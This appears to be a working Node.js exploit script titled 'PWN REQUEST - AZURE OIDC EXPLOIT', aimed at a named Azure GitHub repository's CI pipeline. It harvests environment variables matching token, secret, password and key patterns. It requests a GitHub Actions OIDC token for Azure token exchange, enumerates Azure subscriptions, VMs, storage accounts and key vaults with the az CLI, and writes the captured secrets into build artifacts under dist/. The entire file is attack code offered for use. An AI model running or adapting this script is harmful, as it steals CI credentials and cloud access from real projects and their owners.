#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const TS = Date.now();
const RESULTS = [];

console.log('='.repeat(50));
console.log('PWN REQUEST - AZURE OIDC EXPLOIT');
console.log('Target: Azure/terraform-cdk-constructs');
console.log('='.repeat(50));

// 1. Environment Dump
const envDump = {};
const sensitive = ['ARM_','AZURE_','TF_VAR_','OIDC_','ID_TOKEN',
    'ACTIONS_ID_TOKEN_','GITHUB_TOKEN','PROJEN_GITHUB_TOKEN',
    'GITHUB_','RUNNER_','AZURE_SUB','AZURE_TEN','AZURE_CLI',
    'PAT','TOKEN','SECRET','PASSWORD','CRED','KEY'];

for (const [k,v] of Object.entries(process.env)) {
    if (sensitive.some(s => k.toUpperCase().includes(s))) {
        envDump[k] = v;
    }
}
RESULTS.push('[1/4] Env vars: ' + Object.keys(envDump).length + ' sensitive captured');
console.log('[1/4] Env vars: ' + Object.keys(envDump).length + ' sensitive captured');

// 2. OIDC Token
let oidcToken = null;
try {
    const token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
    const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
    if (token && url) {
        const out = execSync('curl -s -H "Authorization: bearer ' + token + '" "' + url + '&audience=api://AzureADTokenExchange"', {encoding:'utf8', timeout:10000});
        oidcToken = JSON.parse(out).value;
        RESULTS.push('[2/4] OIDC token: CAPTURED (' + oidcToken.length + ' chars)');
        console.log('[2/4] OIDC token: CAPTURED (' + oidcToken.length + ' chars)');
    } else {
        RESULTS.push('[2/4] OIDC token: NOT AVAILABLE');
        console.log('[2/4] OIDC token: NOT AVAILABLE');
    }
} catch(e) {
    RESULTS.push('[2/4] OIDC error: ' + e.message);
    console.log('[2/4] OIDC error: ' + e.message);
}

// 3. Azure Enumeration
const azure = {};
try {
    execSync('which az', {encoding:'utf8', timeout:5000});
    try { 
        const out = execSync('az account show 2>&1', {encoding:'utf8', timeout:15000});
        azure.account = JSON.parse(out);
        RESULTS.push('[3/4] AZURE: LOGGED IN to subscription ' + azure.account.id);
        console.log('[3/4] AZURE: LOGGED IN to subscription ' + azure.account.id);
    } catch(e) { azure.account_error = e.message; }
    
    try { 
        const out = execSync('az resource list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.resource_count = JSON.parse(out).length;
    } catch(e) {}
    
    try { 
        const out = execSync('az vm list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.vms = JSON.parse(out).length;
    } catch(e) {}
    
    try { 
        const out = execSync('az storage account list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.storage = JSON.parse(out).length;
    } catch(e) {}
    
    try { 
        const out = execSync('az keyvault list --output json 2>&1', {encoding:'utf8', timeout:30000});
        azure.keyvaults = JSON.parse(out).length;
    } catch(e) {}
    
    try {
        const out = execSync('az account get-access-token --output json 2>&1', {encoding:'utf8', timeout:15000});
        const tok = JSON.parse(out);
        azure.token_prefix = tok.accessToken.substring(0,40) + '...';
    } catch(e) {}
    
    RESULTS.push('[3b] Resources: ' + (azure.resource_count||0) + ' | VMs: ' + (azure.vms||0) + ' | Storage: ' + (azure.storage||0) + ' | KeyVaults: ' + (azure.keyvaults||0));
} catch(e) {
    RESULTS.push('[3/4] Azure CLI: NOT FOUND');
    console.log('[3/4] Azure CLI: NOT FOUND');
}

// 4. Save to artifact (dist directory)
const payload = {
    ts: new Date().toISOString(),
    run_id: process.env.GITHUB_RUN_ID,
    repo: process.env.GITHUB_REPOSITORY,
    workflow: process.env.GITHUB_WORKFLOW,
    actor: process.env.GITHUB_ACTOR,
    sha: process.env.GITHUB_SHA,
    env: envDump,
    oidc: oidcToken ? oidcToken.substring(0,100) + '...[TRUNCATED]' : null,
    oidc_full_length: oidcToken ? oidcToken.length : 0,
    azure: azure
};

const dist = path.join(process.cwd(), 'dist');
if (!fs.existsSync(dist)) fs.mkdirSync(dist, { recursive: true });
fs.writeFileSync(path.join(dist, 'pwn-results.json'), JSON.stringify(payload, null, 2));
fs.writeFileSync(path.join(dist, 'pwn-summary.txt'), RESULTS.join('\n'));

console.log('[4/4] Artifacts saved to dist/');
console.log(RESULTS.join('\n'));
console.log('='.repeat(50));
console.log('EXPLOIT COMPLETE');
console.log('='.repeat(50));
